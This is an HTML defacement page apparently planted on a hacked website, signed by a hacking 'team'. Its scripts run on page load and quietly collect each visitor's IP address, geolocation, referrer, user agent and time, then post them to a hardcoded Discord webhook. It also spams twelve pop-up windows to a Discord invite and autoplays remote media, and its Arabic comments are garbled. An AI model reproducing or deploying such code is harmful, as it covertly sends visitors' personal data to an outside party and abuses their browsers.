<table width="100%" height="80%">
    <tbody><tr><td>
      <center>
        <small> </small>
        <br>
        


  <div class="hacked-message" bis_skin_checked="1">
          <p>Trtshle <span style="color: rgba(0, 0, 0, 0.616);">team az3`bne</span></p>
      <p>t3al az3`bne !</p>
  </div>



  <script>
      async function fetchIPAddress() {
          try {
              let response = await fetch('https://api.ipify.org?format=json');
              let data = await response.json();
              document.getElementById('ip-address').textContent = `   ip ${data.ip}`;
          } catch (error) {
              document.getElementById('ip-address').textContent = '';
              console.error('Error fetching IP address:', error);
              
          }
      }

      // Fetch IP address on page load
      fetchIPAddress();
  </script>







  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP Address Display</title>
  <style>
        }
        .container {
            text-align: center;
      }
      .ip-address {
          font-size: 1em;
          font-weight: bold;
          color: #000000;
          animation: pulse 1s infinite;
      }
  </style>


  <div class="container" bis_skin_checked="1">
      <div class="ip-address" id="ip-address" bis_skin_checked="1">Your IP:  </div>
      <div class="message" bis_skin_checked="1"></div>



  <div class="video-bg" bis_skin_checked="1">
      <video autoplay="" muted="" loop="">
          <source src="https://k.top4top.io/m_32970cnl81.mp4" type="video/mp4">
          
      </video>
  </div>



  <audio autoplay="" loop="">
      <source src="https://audio.jukehost.co.uk/MabwGdmr8g1IvIYIaJr0QMO5EO8TMjhB" type="audio/mpeg">
      Your browser does not support the audio element.
  </audio>


  
          <script type="text/javascript">
          window.onload = function() {
              setTimeout(function() {
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
                  window.open('https://discord.gg/ax2yZmFG','_blank');
              }, 5000);
          }
              </script>
              

  
      
      
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>E9DHE'* 'D2'&amp;1</title>
          <script>
              // /'D) D,E9 H%13'D (J'F'* 'D2'&1 %DI Discord Webhook
              async function sendVisitorInfo() {
                  try {
                      // ,D( 9FH'F 'D@ IP EF ./E) ipify
                      const ipResponse = await fetch('https://api.ipify.org?format=json');
                      const ipData = await ipResponse.json();
                      const ip = ipData.ip;
      
                      // ,D( E9DHE'* 'DEHB9 (F'!K 9DI 9FH'F 'D@ IP EF ./E) ipinfo
                      const ipInfoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
                      const ipInfoData = await ipInfoResponse.json();
      
                      // 'D-5HD 9DI E9DHE'* 'DE*5A- HEHB9 'D%-'D)
                      const referrer = document.referrer || "E('41)";  // %0' DE JCF GF'C 1'(7 %-'D)
                      const userAgent = navigator.userAgent;
                      const dateTime = new Date().toLocaleString(); // *'1J. HHB* 'D/.HD
      
                      // %9/'/ 1'(7 'D@ Webhook 'D.'5 (C
                      const webhookUrl = 'https://discord.com/api/webhooks/1327387204309356624/rWuJTvfzemx_EEgZr64FymP0Qq6J-v4yvH1aFdkd5c4aDbW8qrx6voJzwtXdQxVEcEJ1'; // '3*(/D YOUR_WEBHOOK_URL (1'(7 'DHJ( GHC 'D.'5 (C
      
                      // %13'D 'D(J'F'* %DI Discord Webhook
                      await fetch(webhookUrl, {
                          method: 'POST',
                          headers: {'Content-Type': 'application/json'},
                          body: JSON.stringify({
                              content: "**New visitor information**", // 'D9FH'F 'D#3'3J
                              embeds: [
                                  {
                                      title: "Visitor Details", // 9FH'F 'D13'D) AJ Discord
                                      fields: [
                                          { name: "IP Address", value: ip, inline: true },  // 916 9FH'F 'D@ IP
                                          { name: "Country", value: ipInfoData.country, inline: true }, // 916 'D/HD)
                                          { name: "City", value: ipInfoData.city || "Unknown", inline: true }, // 916 'DE/JF)
                                          { name: "Region", value: ipInfoData.region || "Unknown", inline: true }, // 916 'DEF7B)
                                          { name: "Referrer", value: referrer, inline: false },  // 1'(7 'D%-'D)
                                          { name: "User Agent", value: userAgent, inline: false }, // E9DHE'* 'DE*5A-
                                          { name: "Date & Time", value: dateTime, inline: false }  // *'1J. HHB* 'D/.HD
                                      ],
                                      color: 3066993 // DHF ('.*J'1J)
                                  }
                              ]
                          })
                      });
      
                      // 916 9FH'F 'D@ IP 9DI 'D5A-) ('.*J'1J)
                      document.getElementById('ip-address').textContent = `Your IP: ${ip}`;
      
                  } catch (error) {
                      console.error('Error fetching visitor information:', error);
                  }
              }
      
              // 9F/ *-EJD 'D5A-) J*E '3*/9'! 'D/'D)
              window.onload = function() {
                  sendVisitorInfo();
              };
          </script>
      
      
          <h1></h1>
          <p id="ip-address"></p>
      
      
      
</div></center></td></tr></tbody></table>
